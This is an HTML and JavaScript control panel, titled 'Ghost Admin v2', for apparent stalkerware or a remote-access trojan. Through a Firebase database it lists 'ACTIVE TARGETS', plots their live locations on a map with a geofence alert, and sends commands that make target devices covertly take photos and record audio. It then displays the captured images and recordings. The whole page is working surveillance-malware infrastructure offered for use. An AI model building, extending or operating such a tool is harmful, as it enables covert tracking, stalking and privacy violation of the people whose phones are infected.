<!DOCTYPE html>
<html>
<head>
    <title>Ghost Admin v2</title>
    <link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css" />
    <script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <style>
        body { display: flex; height: 100vh; margin: 0; background: #0a0a0a; color: #0f0; font-family: monospace; }
        #side { width: 300px; border-right: 1px solid #0f0; padding: 10px; overflow-y: auto; }
        #main { flex-grow: 1; display: flex; flex-direction: column; }
        #map { height: 50%; border-bottom: 1px solid #0f0; }
        #output { height: 50%; overflow-y: auto; padding: 15px; background: #000; }
        .target-card { border: 1px solid #0f0; padding: 10px; margin-bottom: 10px; cursor: pointer; }
        .controls { margin-top: 10px; display: grid; grid-template-columns: 1fr 1fr; gap: 5px; }
        button { background: #0f0; color: #000; border: none; padding: 8px; font-weight: bold; cursor: pointer; }
        button:hover { background: #0c0; }
        .img-box { display: inline-block; margin: 5px; border: 1px solid #555; text-align: center; }
        .img-box img { width: 150px; display: block; }
        .alert { background: red; color: white; padding: 5px; text-align: center; font-weight: bold; }
    </style>
</head>
<body>
    <div id="side">
        <h3>ACTIVE TARGETS</h3>
        <div id="userList"></div>
    </div>
    <div id="main">
        <div id="map"></div>
        <div id="output">
            <h3>LIVE FEED (Select a target)</h3>
            <div id="feedContent"></div>
        </div>
    </div>

    <script>
        const firebaseConfig = { databaseURL: "https://mytrecker2-b3535-default-rtdb.firebaseio.com/" };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();
        var map = L.map('map').setView([0,0], 2);
        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
        var markers = {};
        var currentTarget = "";

        // Geofencing Center (Karachi example - Change this)
        const home = { lat: 24.8607, lng: 67.0011, radius: 1 }; // 1km radius

        db.ref('targets').on('value', snap => {
            const list = document.getElementById('userList');
            list.innerHTML = "";
            snap.forEach(user => {
                const id = user.key;
                const loc = user.val().location;
                if(!loc) return;

                // Geofence check
                const dist = getDist(home.lat, home.lng, loc.lat, loc.lng);
                const isOut = dist > home.radius;

                const card = document.createElement('div');
                card.className = "target-card";
                card.innerHTML = `<b>${id}</b><br>${isOut ? '<div class="alert">OUT OF AREA</div>' : 'In Range'}<br>
                <div class="controls">
                    <button onclick="sendCmd('${id}', 'snap')">üì∏ PHOTO</button>
                    <button onclick="sendCmd('${id}', 'mic')">üéôÔ∏è AUDIO</button>
                </div>`;
                card.onclick = () => { currentTarget = id; map.setView([loc.lat, loc.lng], 17); loadFeed(id); };
                list.appendChild(card);

                if(!markers[id]) markers[id] = L.marker([loc.lat, loc.lng]).addTo(map);
                else markers[id].setLatLng([loc.lat, loc.lng]);
            });
        });

        function sendCmd(id, act) { db.ref('commands/' + id).set({ action: act, sec: 15 }); alert("Command Sent!"); }

        function loadFeed(id) {
            const feed = document.getElementById('feedContent');
            feed.innerHTML = "<h4>Viewing Feed: "+id+"</h4><div id='photos'></div><div id='audios'></div>";
            
            db.ref('targets/'+id+'/photos').on('child_added', s => {
                const p = s.val();
                document.getElementById('photos').innerHTML += `<div class="img-box"><img src="${p.image}"><small>${p.type} @ ${p.time}</small></div>`;
            });

            db.ref('targets/'+id+'/audio').on('child_added', s => {
                const a = s.val();
                document.getElementById('audios').innerHTML += `<div style="margin:10px;">üîä Audio (${a.time})<br><audio controls src="${a.data}"></audio></div>`;
            });
        }

        function getDist(l1, n1, l2, n2) {
            const R = 6371; const dL = (l2-l1)*Math.PI/180; const dN = (n2-n1)*Math.PI/180;
            const a = Math.sin(dL/2)**2 + Math.cos(l1*Math.PI/180)*Math.cos(l2*Math.PI/180)*Math.sin(dN/2)**2;
            return R * 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
        }
    </script>
</body>
</html>
